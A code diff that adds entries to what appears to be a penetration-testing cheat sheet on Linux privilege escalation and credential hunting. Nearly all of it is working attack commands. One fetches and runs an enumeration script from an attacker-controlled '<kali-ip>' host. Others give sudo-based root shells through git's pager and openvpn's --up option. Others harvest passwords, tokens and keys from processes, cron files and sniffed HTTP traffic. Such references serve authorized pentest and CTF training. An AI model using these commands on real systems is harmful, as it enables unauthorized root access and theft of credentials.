@@ -36,6 +36,16 @@ ls -la /opt /var/www /home`,
 dpkg -l 2>/dev/null | awk '{print $2,$3}'
 rpm -qa 2>/dev/null`,
                 },
+                {
+                    label: 'lse.sh (Linux Smart Enumeration)',
+                    code: `wget http://<kali-ip>/lse.sh -O /tmp/lse.sh && bash /tmp/lse.sh -l 1
+# -l 1: quick scan; -l 2: deeper (more output)`,
+                },
+                {
+                    label: 'unix-privesc-check + suggester',
+                    code: `./unix-privesc-check standard > upc.txt
+./linux-exploit-suggester.sh -k $(uname -r)`,
+                },
             ],
             tags: ['linpeas', 'enumeration', 'sudo', 'suid'],
         },
@@ -71,6 +81,11 @@ sudo LD_PRELOAD=/tmp/x.so <allowed-binary>`,
                     label: 'sudo git pager',
                     code: `sudo PAGER='sh -c "exec sh 0<&1"' git -p help
 # GTFOBins: sudo -u root <bin>  then look up the binary`,
+                },
+                {
+                    label: 'sudo openvpn (GTFOBins)',
+                    code: `# sudo -l shows openvpn -> root shell via --up:
+sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'`,
                 },
             ],
             references: [{ label: 'GTFOBins', url: 'https://gtfobins.github.io/' }],
@@ -234,6 +249,12 @@ find / -name id_rsa 2>/dev/null; cat ~/.bash_history`,
 ls -la /var/mail /var/spool/mail
 find / -name '*.kdbx' -o -name 'id_rsa' -o -name '*.pem' 2>/dev/null
 env | grep -iE 'pass|key|token'`,
+                },
+                {
+                    label: 'Live process + traffic creds',
+                    code: `watch -n1 'ps aux | grep -iE "pass|token|key"'
+sudo tcpdump -i any -A -s0 port 80 2>/dev/null | grep -iE 'pass|user|token'
+grep -rniE 'password|passwd|secret' /etc/cron* /var/spool/cron 2>/dev/null`,
                 },
             ],
             tags: ['credentials', 'ssh-key', 'config', 'hunting'],
